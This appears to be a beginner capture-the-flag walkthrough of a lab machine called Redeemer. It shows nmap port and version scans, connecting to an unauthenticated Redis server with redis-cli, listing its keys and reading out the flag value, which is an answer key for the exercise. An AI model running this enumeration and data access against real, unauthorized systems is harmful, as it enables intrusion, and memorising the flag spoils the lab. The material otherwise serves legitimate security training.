Redeemer is a very easy Linux machine which explores the enumeration and exploitation of a Redis database server while showcasing the redis-cli command line utility and basic commands to interact with the Redis service.



Which TCP port is open on the machine?
❯ sudo nmap 10.129.48.96 -p- -sS
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-31 15:06 -0400
Nmap scan report for 10.129.48.96
Host is up (0.060s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
6379/tcp open  redis

Nmap done: 1 IP address (1 host up) scanned in 23.73 seconds

Which service is running on the port that is open on the machine?
 sudo nmap 10.129.48.96 -p 6379 -sS -sV
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-31 15:07 -0400
Nmap scan report for 10.129.48.96
Host is up (0.059s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds

What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database
In-memory databse

Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.
redis-cli

Which flag is used with the Redis command-line utility to specify the hostname?
 redis-cli -h                                                                                                                                                                   
redis-cli 8.0.5    

Now connect to redis server with  redis-cli -h 10.129.48.96

Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?
info

What is the version of the Redis server being used on the target machine?
with info: 5.0.7

Which command is used to select the desired database in Redis?
select
select


Which command is used to obtain all the keys in a database?
0.129.48.96:6379> select 0
OK
10.129.48.96:6379> key *
(error) ERR unknown command `key`, with args beginning with: `*`, 
10.129.48.96:6379> keys *
1) "numb"
2) "flag"
3) "stor"
4) "temp"
10.129.48.96:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
10.129.48.96:6379> 